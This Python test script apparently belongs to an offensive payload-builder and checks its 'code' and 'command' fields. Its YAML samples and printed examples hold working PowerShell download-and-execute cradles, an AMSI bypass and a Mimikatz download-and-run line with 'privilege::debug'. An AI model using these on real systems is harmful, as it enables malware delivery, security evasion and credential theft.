#!/usr/bin/env python3
"""
Test code vs command field support in ps-features.yaml
"""
import yaml
from pathlib import Path

print("="*70)
print("Testing 'code' vs 'command' Field Support")
print("="*70)

# Create test YAML content
test_yaml = """
# Example with 'code' field (template)
- name: Test Code Template
  type: cradle-ps1
  code: |
    IWR -Uri "{url}/{output_file}" | IEX

# Example with 'command' field (executes)
- name: Test Command Execution
  type: cradle-ps1
  command: |
    echo "Generated cradle output"

# Example AMSI with code
- name: AMSI Code Example
  type: amsi
  code: |
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Example AMSI with command
- name: AMSI Command Example
  type: amsi
  command: |
    echo "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)"
"""

features = yaml.safe_load(test_yaml)

print(f"\nLoaded {len(features)} test features")
print("\n" + "-"*70)

for feature in features:
    name = feature.get('name', 'Unknown')
    ftype = feature.get('type', 'unknown')
    has_code = 'code' in feature
    has_command = 'command' in feature
    
    print(f"\n{name}:")
    print(f"  Type: {ftype}")
    print(f"  Has 'code': {has_code}")
    print(f"  Has 'command': {has_command}")
    
    if has_code:
        print(f"  Code preview: {feature['code'][:50]}...")
    if has_command:
        print(f"  Command preview: {feature['command'][:50]}...")

print("\n" + "="*70)
print("Implementation Summary")
print("="*70)
print("""
✓ ps-features.yaml now supports BOTH fields:

1. 'code' field (template):
   - Content is treated as a template
   - Variables like {url}, {args}, etc. are replaced
   - Conditional blocks {if args}...{fi} are processed
   - Used directly as the output

2. 'command' field (execution):
   - Content is executed as a shell command
   - Variables are replaced BEFORE execution
   - Command output (stdout) becomes the cradle/bypass code
   - Errors are captured and reported with the command

✓ Applies to:
   - Cradles (cradle-ps1, cradle-exe, cradle-dll)
   - AMSI bypasses (type: amsi)

✓ Updated locations:
   - src/web/app.py: generate_cradle() function
   - src/web/app.py: inject_amsi_bypass_launch_instructions()
   - src/web/app.py: load_amsi_bypasses()
   - src/core/payload_builder.py: _insert_amsi_bypass_template()

✓ Error messages now show:
   - Which field is missing (if neither code nor command)
   - The command that was executed (for command field)
   - Exit code and stderr on failure
   - Timeout information
""")

print("\nExample use cases:")
print("-"*70)
print("""
1. Static template (code):
   - name: Simple Cradle
     type: cradle-ps1
     code: |
       IWR "{url}/{output_file}" | IEX

2. Dynamic generation (command):
   - name: CradleCrafter
     type: cradle-ps1
     command: |
       pwsh -Command "Invoke-CradleCrafter -Url '{url}/{output_file}' -Quiet"

3. Conditional command:
   - name: Mimikatz
     type: cradle-exe  
     command: |
       echo "(New-Object Net.WebClient).DownloadFile('{url}/{output_file}', '$env:TEMP\\{output_file}'); & '$env:TEMP\\{output_file}' {if args}'{args}'{fi} 'privilege::debug'"
""")
